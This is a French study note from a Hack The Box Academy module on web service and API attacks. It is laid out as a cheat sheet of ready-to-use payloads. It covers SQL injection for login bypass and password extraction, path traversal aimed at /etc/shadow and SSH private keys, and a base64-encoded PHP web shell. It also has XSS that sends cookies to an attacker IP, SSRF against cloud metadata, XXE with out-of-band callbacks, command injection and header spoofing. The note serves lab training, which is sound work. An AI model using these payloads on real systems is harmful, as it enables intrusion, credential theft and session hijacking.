---
titre: "Cheatsheet — Payloads"
aliases:
  - "Cheatsheet — Payloads"
plateforme: "Hack The Box Academy"
module: "Web Service & API Attacks"
date: 2026-07-02
tags: [HTB, API, Cheatsheet, Payloads, Reference, Notes]
---

# 📋 Cheatsheet — Payloads

> Tous les payloads du module en un endroit. Ctrl+F ton besoin.

Lié : [[API & Web Server - Index]]

---

## 🗄️ SQL Injection

### Détection
```
'        "        `        \        ')       ";
1' OR '1'='1        1 OR 1=1        admin'-- -
```

### UNION — méthode
```
' ORDER BY 1-- -   (incrémente jusqu'à l'erreur → nb colonnes)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT '1','2','3'-- -            (repérer la colonne affichée)
' UNION SELECT username,password,NULL FROM users-- -
```
Commentaires : `-- -` (MySQL, espace obligatoire) · `#` · `/* */`

### Auth bypass
```
' OR '1'='1'-- -
admin'-- -
' OR 1=1 LIMIT 1-- -
```

### MySQL — énumération
```
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT @@version,database()-- -
```

### SQLite — énumération (⚠️ SGBD du Skills Assessment)
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
' UNION SELECT sqlite_version(),NULL-- -
```

### SOAP — extraction ciblée (contexte module)
```
admin' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -            (5 colonnes)
admin' UNION SELECT '1','2','3','4','5'-- -                 (marqueurs)
zzz' UNION SELECT id,name,email,username,password FROM users WHERE username='admin'-- -
```

---

## 📂 LFI / Path Traversal

```
../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd     (encodé, spammer les ../)
....//....//etc/passwd                              (bypass filtre ../ )
%252e%252e%252f                                     (double encodage)
..%c0%af..%c0%af                                    (UTF-8 overlong)
```
Wrappers PHP :
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
```
Cibles :
```
/etc/passwd  /etc/shadow  /etc/hosts
/home/<user>/.ssh/id_rsa  id_ed25519  id_ecdsa
/var/www/html/config.php  app.js  .env  wp-config.php
/proc/self/environ  /proc/self/cmdline
/var/log/apache2/access.log   (log poisoning)
```

---

## 🌐 XSS

```html
<script>alert(document.domain)</script>
%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E     (URL-encodé 1x)
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<button autofocus onfocus=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
```
Exfil cookie :
```html
<script>fetch('http://TON_IP/?c='+document.cookie)</script>
<img src=x onerror="this.src='http://TON_IP/?c='+document.cookie">
```

---

## 🔁 SSRF

```
http://TON_IP:4444                          (preuve, listener)
http://127.0.0.1:PORT                        (scan interne)
```
Base64 (format attendu par certaines API) :
```bash
echo "http://127.0.0.1:3002" | tr -d '\n' | base64
```
Bypass blacklist de 127.0.0.1 :
```
localhost      127.1      0.0.0.0      [::1]
2130706433     0x7f000001     0177.0.0.1
```
Cloud / interne :
```
http://169.254.169.254/latest/meta-data/       (AWS)
http://metadata.google.internal/                (GCP)
http://127.0.0.1:6379  (Redis)   :3306 (MySQL)   :8080 (admin)
```

---

## 📄 XXE

Preuve (OOB) :
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://TON_IP:4444">]><root><email>&x;</email><password>x</password></root>
```
Lecture de fichier (in-band) :
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root><email>&x;</email><password>x</password></root>
```
PHP filter (fichiers "cassants") :
```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```
OOB via DTD externe :
```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://TON_VPS/evil.dtd"> %d;]>
```

---

## 💥 Command Injection

Séparateurs :
```
; id      | id      || id      && id      `id`      $(id)      %0a id
```
call_user_func_array (contexte module) :
```
/ping-server.php/system/id
/ping-server.php/system/id%20-a          (%20 = espace)
/ping-server.php/system/cat%20/etc/passwd
```

---

## 🧼 ReDoS

Pattern email vulnérable :
```
/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/
```
Payload (finir par un caractère invalide `.`) :
```
jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.
```
Test : `time curl -m 60 "http://T:3000/api/check-email?email=<payload>"`

---

## 🧩 SOAPAction Spoofing

```xml
<!-- body=LoginRequest (autorisé) + params de ExecuteCommand + header SOAPAction=ExecuteCommand -->
<soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>id</cmd></LoginRequest></soap:Body>
```
```
Header:  SOAPAction: "ExecuteCommand"
```

---

## 🔓 Bypass rate limit / whitelist IP (headers)

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

---

## 🔤 Table d'encodage URL rapide

| Char | Encodé |  | Char | Encodé |
|---|---|---|---|---|
| espace | `%20` | | `<` | `%3C` |
| `/` | `%2F` | | `>` | `%3E` |
| `?` | `%3F` | | `"` | `%22` |
| `#` | `%23` | | `'` | `%27` |
| `&` | `%26` | | `:` | `%3A` |
| `=` | `%3D` | | `%` | `%25` |

Double encodage = encoder le `%` : `/` → `%2F` → `%252F`.
